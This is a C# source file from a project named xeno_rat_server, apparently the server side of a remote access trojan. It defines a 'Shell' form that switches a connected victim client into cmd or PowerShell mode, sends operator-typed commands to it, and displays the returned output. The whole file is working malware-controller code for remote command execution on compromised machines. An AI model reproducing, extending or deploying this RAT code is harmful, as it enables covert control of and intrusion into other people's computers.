using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace xeno_rat_server.Forms
{
    public partial class Shell : Form
    {
        Node client;
        public Shell(Node _client)
        {
            client = _client;
            InitializeComponent();
            RecvThread();
        }

        /// <summary>
        /// Asynchronously receives data from the connected client and updates the UI with the received data.
        /// </summary>
        /// <remarks>
        /// This method continuously listens for incoming data from the connected client using asynchronous operations.
        /// When data is received, it is decoded from bytes to a string using UTF-8 encoding and appended to the text box in the UI, followed by a new line.
        /// The method runs until the client is disconnected or an error occurs.
        /// </remarks>
        /// <exception cref="InvalidOperationException">Thrown when the client is not in a connected state.</exception>
        public async Task RecvThread() 
        {
            while (client.Connected())
            {
                byte[] data = await client.ReceiveAsync();
                if (data == null)
                {
                    break;
                }
                textBox1.BeginInvoke((Action)(() =>
                {
                    textBox1.Text += Encoding.UTF8.GetString(data) + System.Environment.NewLine;
                }));
            }
        }

        /// <summary>
        /// Event handler for the form load event.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        private void Shell_Load(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// Clears the text in textBox1 and sends a byte array with value 1 using the client asynchronously.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <remarks>
        /// This method clears the text in textBox1 and then sends a byte array with value 1 using the client asynchronously.
        /// </remarks>
        private async void button1_Click(object sender, EventArgs e)
        {
            textBox1.Clear();
            await client.SendAsync(new byte[] { 1 });
            //cmd
        }

        /// <summary>
        /// Clears the text in the textBox and sends an asynchronous message to the client with the byte value 2.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <remarks>
        /// This method clears the text in the textBox and then sends an asynchronous message to the client using the SendAsync method of the client object.
        /// The message sent contains a byte value of 2.
        /// </remarks>
        private async void button2_Click(object sender, EventArgs e)
        {
            textBox1.Clear();
            await client.SendAsync(new byte[] { 2 });
            //powershell
        }

        /// <summary>
        /// Sends a byte array with value 0 followed by the UTF-8 encoded text from <paramref name="textBox2"/> using the <paramref name="client"/>.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <remarks>
        /// This method asynchronously sends a byte array with value 0 followed by the UTF-8 encoded text from <paramref name="textBox2"/> using the <paramref name="client"/>.
        /// After sending, the text in <paramref name="textBox2"/> is cleared.
        /// </remarks>
        private async void button3_Click(object sender, EventArgs e)
        {
            await client.SendAsync(new byte[] { 0 });
            await client.SendAsync(Encoding.UTF8.GetBytes(textBox2.Text));
            textBox2.Clear();
            //enter
        }

        /// <summary>
        /// Handles the KeyDown event for textBox2. If the Enter key is pressed, it triggers the click event for button3 and suppresses the key press.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">A KeyEventArgs that contains the event data.</param>
        /// <remarks>
        /// This method checks if the Enter key is pressed and, if so, triggers the click event for button3 and suppresses the key press to prevent further processing of the Enter key.
        /// </remarks>
        private void textBox2_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyData == Keys.Enter)
            {
                button3.PerformClick();
                e.Handled = true;
                e.SuppressKeyPress = true;
            }
        }

        /// <summary>
        /// Sets the cursor position to the end of the text and scrolls the text box to ensure the cursor is visible when the text box becomes visible.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <exception cref="System.InvalidOperationException">Thrown when the text box is not in a valid state for the operation.</exception>
        private void textBox1_VisibleChanged(object sender, EventArgs e)
        {
            if (textBox1.Visible)
            {
                textBox1.SelectionStart = textBox1.TextLength;
                textBox1.ScrollToCaret();
            }
        }
    }
}
